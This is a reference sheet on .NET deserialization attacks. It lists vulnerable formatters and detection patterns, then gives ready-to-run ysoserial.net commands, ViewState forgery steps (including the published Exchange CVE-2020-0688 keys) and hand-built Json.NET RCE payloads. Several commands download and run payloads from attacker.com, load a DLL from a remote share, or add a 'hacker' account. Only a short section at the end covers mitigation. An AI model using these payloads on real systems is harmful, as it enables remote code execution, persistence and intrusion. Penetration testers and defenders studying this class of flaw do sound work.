# .NET Deserialization Attack Chains Reference

## Overview

.NET deserialization vulnerabilities occur when untrusted data is passed to insecure deserializers.
The attack surface spans multiple formatters, each with known gadget chains that achieve
Remote Code Execution (RCE), file operations, or denial of service.

---

## 1. Dangerous Formatters

### 1.1 BinaryFormatter (CRITICAL)

**Detection patterns:**
```csharp
BinaryFormatter bf = new BinaryFormatter();
bf.Deserialize(stream);                         // direct
bf.Deserialize(memoryStream);                   // via MemoryStream
bf.UnsafeDeserialize(stream, null);             // unsafe variant
```

**Sink signatures:**
```
System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Deserialize
System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.UnsafeDeserialize
```

### 1.2 SoapFormatter

**Detection patterns:**
```csharp
SoapFormatter sf = new SoapFormatter();
sf.Deserialize(stream);
```

**Sink:** `System.Runtime.Serialization.Formatters.Soap.SoapFormatter.Deserialize`

### 1.3 ObjectStateFormatter

**Detection patterns:**
```csharp
ObjectStateFormatter osf = new ObjectStateFormatter();
osf.Deserialize(inputString);     // string input
osf.Deserialize(stream);          // stream input
```

Used internally by `LosFormatter` and ASP.NET ViewState.

### 1.4 NetDataContractSerializer

**Detection patterns:**
```csharp
NetDataContractSerializer ndcs = new NetDataContractSerializer();
ndcs.ReadObject(stream);
ndcs.ReadObject(xmlReader);
```

**Sink:** `System.Runtime.Serialization.NetDataContractSerializer.ReadObject`

### 1.5 DataContractSerializer (conditional)

Exploitable when type is user-controlled:
```csharp
DataContractSerializer dcs = new DataContractSerializer(Type.GetType(userInput));
dcs.ReadObject(xmlReader);
```

### 1.6 LosFormatter

**Detection patterns:**
```csharp
LosFormatter lf = new LosFormatter();
lf.Deserialize(inputString);
lf.Deserialize(stream);
```

Wraps `ObjectStateFormatter` internally.

### 1.7 XmlSerializer (conditional)

Exploitable when type parameter is attacker-controlled:
```csharp
XmlSerializer xs = new XmlSerializer(Type.GetType(userInput));
xs.Deserialize(xmlReader);
```

### 1.8 JavaScriptSerializer (conditional)

Exploitable with custom `JavaScriptTypeResolver`:
```csharp
JavaScriptSerializer jss = new JavaScriptSerializer(new SimpleTypeResolver());
jss.Deserialize<object>(jsonString);
```

### 1.9 Json.NET / Newtonsoft.Json

Exploitable when `TypeNameHandling != None`:
```csharp
JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // or Auto, Objects, Arrays
});
```

---

## 2. Gadget Chains (ysoserial.net)

### 2.1 TypeConfuseDelegate

- **Target:** `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`
- **Impact:** OS command execution
- **Requires:** `System.dll`

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 \
  -c "cmd /c whoami > C:\\proof.txt"

ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o raw \
  -c "powershell -enc <BASE64_PAYLOAD>"
```

### 2.2 TextFormattingRunProperties

- **Target:** `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`
- **Impact:** OS command execution
- **Requires:** `Microsoft.VisualStudio.Text.UI.Wpf.dll` (present in VS/some .NET installs)

```bash
ysoserial.exe -f BinaryFormatter -g TextFormattingRunProperties -o base64 \
  -c "cmd /c net user hacker P@ss123 /add"

ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -o raw \
  -c "calc.exe"
```

### 2.3 PSObject

- **Target:** `BinaryFormatter`, `NetDataContractSerializer`
- **Impact:** OS command execution
- **Requires:** PowerShell `System.Management.Automation.dll`

```bash
ysoserial.exe -f BinaryFormatter -g PSObject -o base64 \
  -c "cmd /c ping attacker.com"
```

### 2.4 WindowsIdentity

- **Target:** `BinaryFormatter`, `NetDataContractSerializer`, `SoapFormatter`
- **Impact:** OS command execution

```bash
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 \
  -c "cmd /c certutil -urlcache -f http://attacker.com/shell.exe C:\\shell.exe"
```

### 2.5 ClaimsIdentity

- **Target:** `BinaryFormatter`, `SoapFormatter`
- **Impact:** OS command execution

```bash
ysoserial.exe -f BinaryFormatter -g ClaimsIdentity -o base64 \
  -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps.ps1')"
```

### 2.6 ActivitySurrogateSelector

- **Target:** `BinaryFormatter`, `NetDataContractSerializer`
- **Impact:** Arbitrary .NET code execution (not just OS commands)

```bash
ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelector -o base64 \
  -c "cmd /c whoami"
```

### 2.7 ObjectDataProvider

- **Target:** `DataContractSerializer`, `XmlSerializer`, `Json.NET`
- **Impact:** OS command execution via `System.Diagnostics.Process.Start`

```bash
ysoserial.exe -f DataContractSerializer -g ObjectDataProvider -o raw \
  -c "cmd /c whoami"
```

**Json.NET payload (manual):**
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib",
    "$values": ["cmd", "/c whoami"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System"
  }
}
```

### 2.8 ExpandedWrapper

- **Target:** `DataContractSerializer`, `XmlSerializer`
- **Impact:** OS command execution (wraps `ObjectDataProvider`)

```bash
ysoserial.exe -f DataContractSerializer -g ExpandedWrapper -o raw \
  -c "cmd /c whoami"
```

---

## 3. ViewState Exploitation

### 3.1 Detection

Look for `__VIEWSTATE` in HTTP responses or hidden form fields:
```html
<input type="hidden" name="__VIEWSTATE" value="/wEPDwUKMTY1..." />
```

Check `web.config` for ViewState MAC validation:
```xml
<pages enableViewStateMac="false" />          <!-- VULNERABLE -->
<pages viewStateEncryptionMode="Never" />     <!-- VULNERABLE -->
```

### 3.2 Detecting MachineKey

Check `web.config`:
```xml
<machineKey
  validationKey="CB2721ABDAF8E9DC516D..."
  decryptionKey="E9D2...."
  validation="SHA1"
  decryption="AES" />
```

Brute-force with Blacklist3r:
```bash
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata "/wEPDwUK..."
```

### 3.3 Generating Malicious ViewState

**Without MAC validation (enableViewStateMac=false):**
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c whoami > C:\\proof.txt" \
  --islegacy --isdebug
```

**With known machineKey:**
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
  -c "powershell -enc <B64>" \
  --validationalg="SHA1" \
  --validationkey="CB2721ABDAF8E9DC516D..." \
  --decryptionalg="AES" \
  --decryptionkey="E9D2..." \
  --apppath="/" --path="/default.aspx" \
  --islegacy
```

**ASP.NET >= 4.5 (non-legacy):**
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c whoami" \
  --validationalg="SHA1" \
  --validationkey="CB2721..." \
  --decryptionalg="AES" \
  --decryptionkey="E9D2..." \
  --apppath="/" --path="/default.aspx"
```

### 3.4 ViewState via Exchange (CVE-2020-0688)

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "cmd /c whoami" \
  --validationalg="SHA1" \
  --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" \
  --decryptionalg="AES" \
  --decryptionkey="E9D2BB2275536F20966400090915BACF2DB538B2E0B9F029" \
  --apppath="/" --path="/ecp/default.aspx"
```

---

## 4. Json.NET TypeNameHandling Payloads

### 4.1 ObjectDataProvider RCE

```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "$values": ["cmd.exe", "/c whoami > C:\\proof.txt"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
  }
}
```

### 4.2 System.Configuration.Install.AssemblyInstaller (DLL load)

```json
{
  "$type": "System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
  "Path": "\\\\attacker.com\\share\\evil.dll"
}
```

### 4.3 System.Windows.Markup.XamlReader (XAML RCE)

```json
{
  "$type": "System.Windows.Markup.XamlReader, PresentationFramework",
  "xml": "<ResourceDictionary xmlns='http://schemas.microsoft.com/winfx/2006/xaml/presentation' xmlns:x='http://schemas.microsoft.com/winfx/2006/xaml' xmlns:System='clr-namespace:System;assembly=mscorlib' xmlns:Diag='clr-namespace:System.Diagnostics;assembly=system'><ObjectDataProvider x:Key='foobar' ObjectType='{x:Type Diag:Process}' MethodName='Start'><ObjectDataProvider.MethodParameters><System:String>cmd.exe</System:String><System:String>/c calc</System:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>"
}
```

### 4.4 Detection in code

```csharp
// VULNERABLE patterns
TypeNameHandling = TypeNameHandling.All
TypeNameHandling = TypeNameHandling.Auto
TypeNameHandling = TypeNameHandling.Objects
TypeNameHandling = TypeNameHandling.Arrays

// SAFE
TypeNameHandling = TypeNameHandling.None     // default
```

---

## 5. Quick Reference: Formatter → Gadget Matrix

| Gadget Chain                    | BinaryFormatter | SoapFormatter | NetDataContract | DataContract | XmlSerializer | Json.NET |
|---------------------------------|:---:|:---:|:---:|:---:|:---:|:---:|
| TypeConfuseDelegate             | ✓ | ✓ | ✓ | — | — | — |
| TextFormattingRunProperties     | ✓ | ✓ | ✓ | — | — | — |
| PSObject                        | ✓ | — | ✓ | — | — | — |
| WindowsIdentity                 | ✓ | ✓ | ✓ | — | — | — |
| ClaimsIdentity                  | ✓ | ✓ | — | — | — | — |
| ActivitySurrogateSelector       | ✓ | — | ✓ | — | — | — |
| ObjectDataProvider              | — | — | — | ✓ | ✓ | ✓ |
| ExpandedWrapper                 | — | — | — | ✓ | ✓ | — |

---

## 6. Mitigation Notes (for report context)

- **BinaryFormatter** is deprecated in .NET 5+ — flag any usage as high risk.
- `SerializationBinder` / `ISerializationBinder` can restrict types but are bypassable.
- The only safe fix for `BinaryFormatter` is removal; binder allowlists are fragile.
- For Json.NET, set `TypeNameHandling = TypeNameHandling.None` and use a strict `SerializationBinder`.
- ViewState: enforce `enableViewStateMac="true"` and `viewStateEncryptionMode="Always"`.
- Prefer `System.Text.Json` over `Newtonsoft.Json` — it has no type-name handling by default.
